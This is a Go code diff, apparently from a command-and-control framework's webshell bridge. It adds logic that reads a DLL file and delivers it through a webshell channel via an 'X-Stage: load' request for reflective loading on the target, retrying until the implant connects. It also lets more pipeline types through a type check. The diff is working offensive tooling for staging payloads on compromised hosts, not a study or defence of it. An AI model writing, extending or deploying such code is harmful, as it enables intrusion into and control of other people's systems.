@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"os"
 	"strconv"
 	"sync"
 	"time"
@@ -114,6 +115,18 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 	channel := NewChannel(b.cfg.WebshellHTTPURL(), b.cfg.StageToken)
 	logs.Log.Importantf("waiting for DLL at %s ...", b.cfg.WebshellHTTPURL())
 
+	// Read DLL bytes once if --dll is provided.
+	var dllBytes []byte
+	if b.cfg.DLLPath != "" {
+		var err error
+		dllBytes, err = os.ReadFile(b.cfg.DLLPath)
+		if err != nil {
+			return fmt.Errorf("read DLL file %s: %w", b.cfg.DLLPath, err)
+		}
+		logs.Log.Importantf("loaded DLL from %s (%d bytes)", b.cfg.DLLPath, len(dllBytes))
+	}
+
+	dllDelivered := false
 	delay := retryBaseDelay
 	for attempt := 1; attempt <= retryMaxAttempts; attempt++ {
 		select {
@@ -123,6 +136,17 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 		}
 
 		if err := channel.Connect(ctx); err != nil {
+			// Auto-load DLL if we have it and haven't delivered yet.
+			if dllBytes != nil && !dllDelivered {
+				logs.Log.Importantf("DLL not loaded, delivering via X-Stage: load (%d bytes)", len(dllBytes))
+				if loadErr := channel.LoadDLL(ctx, dllBytes); loadErr != nil {
+					logs.Log.Warnf("DLL delivery failed (attempt %d/%d): %v", attempt, retryMaxAttempts, loadErr)
+				} else {
+					logs.Log.Important("DLL delivered, waiting for reflective load")
+					dllDelivered = true
+				}
+			}
+
 			logs.Log.Debugf("DLL not ready (attempt %d/%d): %v (retry in %s)",
 				attempt, retryMaxAttempts, err, delay)
 			if attempt == retryMaxAttempts {
@@ -260,8 +284,8 @@ func (b *Bridge) handlePipelineStart(ctx context.Context, job *clientpb.Job) err
 	if pipe == nil {
 		return fmt.Errorf("missing pipeline in start job")
 	}
-	if pipe.GetType() != pipelineType {
-		return fmt.Errorf("unsupported pipeline type %q", pipe.GetType())
+	if t := pipe.GetType(); t != pipelineType && t != "tcp" && t != "" {
+		return fmt.Errorf("unsupported pipeline type %q", t)
 	}
 	if err := b.ensurePipelineMatch(pipe.GetName()); err != nil {
 		return err
